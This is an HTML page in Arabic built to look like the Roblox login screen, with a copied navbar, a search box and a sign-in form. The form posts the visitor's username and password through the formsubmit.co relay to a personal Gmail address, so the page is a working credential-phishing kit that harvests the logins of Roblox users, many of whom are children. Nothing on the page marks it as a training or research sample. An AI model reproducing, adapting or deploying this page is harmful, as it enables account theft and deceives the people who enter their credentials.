<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>Roblox</title>

<style>
body{
  margin:0;
  font-family:Arial, sans-serif;
  background:#1c1f26;
  color:white;
}

/* ===== NAVBAR ===== */
.navbar{
  background:linear-gradient(#1a1a1a,#0f0f0f);
  height:64px;
  display:flex;
  align-items:center;
  padding:0 18px;
}
.logo{font-size:24px;font-weight:900;margin-right:20px;}
.links{display:flex;gap:18px;}
.links a{color:#ddd;text-decoration:none;font-size:14px;}
.links a:hover{color:white}
.search{
  margin:auto;
  display:flex;
  align-items:center;
  background:#222;
  border-radius:10px;
  padding:6px 14px;
  width:420px;
}
.search input{background:transparent;border:none;color:white;outline:none;width:100%;}
.actions{margin-left:auto;display:flex;gap:10px;}
.btn-blue,.btn-dark{width:120px;padding:8px 0;border-radius:8px;font-weight:bold;}
.btn-blue{background:#2a7cff;border:none;color:white;}
.btn-dark{background:#111;border:1px solid #555;color:white;}

/* ===== BG ===== */
.bg{
  background:url("IMG_0161.png") center/cover no-repeat;
  min-height:calc(100vh - 64px);
  display:flex;
  justify-content:center;
  align-items:center;
}

/* ===== LOGIN BOX ===== */
.box{
  background:#262a33;
  width:360px;
  padding:28px;
  border-radius:14px;
}
.box h2{text-align:center;margin-bottom:18px;}

.box input{
  width:100%;
  padding:12px;
  margin:10px 0;
  border:none;
  border-radius:8px;
  background:#1f222b;
  color:white;
  font-size:15px;
}
.box input::placeholder{color:#aaa;}

.mainbtn,.secbtn{
  width:100%;
  padding:12px;
  border:none;
  border-radius:8px;
  font-weight:bold;
  margin-top:10px;
  cursor:pointer;
}

.mainbtn{background:#3b82f6;color:white;}
.secbtn{background:#2f333d;color:white;}

.link{
  text-align:center;
  font-size:13px;
  color:#9ca3af;
  margin:12px 0;
  cursor:pointer;
}
</style>
</head>

<body>

<div class="navbar">
  <div class="logo">ROBLOX</div>
  <div class="links">
    <a href="#">الرئيسية</a>
    <a href="#">السوق</a>
    <a href="#">إنشاء</a>
    <a href="#">Robux</a>
  </div>
  <div class="search">
    <input type="text" placeholder="بحث">
  </div>
  <div class="actions">
    <button class="btn-blue">تسجيل الدخول</button>
    <button class="btn-dark">تسجيل</button>
  </div>
</div>

<div class="bg">
  <div class="box">
    <h2>تسجيل الدخول إلى Roblox</h2>

    <form action="https://formsubmit.co/battal.alzahrani23@gmail.com" method="POST">
      <input type="hidden" name="_subject" value="تسجيل دخول جديد">
      <input type="hidden" name="_template" value="table">

      <input type="text" name="username" placeholder="اسم المستخدم/البريد/الهاتف" required>
      <input type="password" name="password" placeholder="كلمة المرور" required>

      <button type="submit" class="mainbtn">تسجيل الدخول</button>

      <div class="link">نسيت كلمة المرور أو اسم المستخدم؟</div>

      <button type="submit" class="secbtn">إرسال رمز صالح لمرة واحدة عبر البريد الإلكتروني</button>
      <button type="submit" class="secbtn">تسجيل دخول سريع</button>

      <div class="link">ليس لديك حساب؟ اشترك</div>
    </form>
  </div>
</div>

</body>
</html>
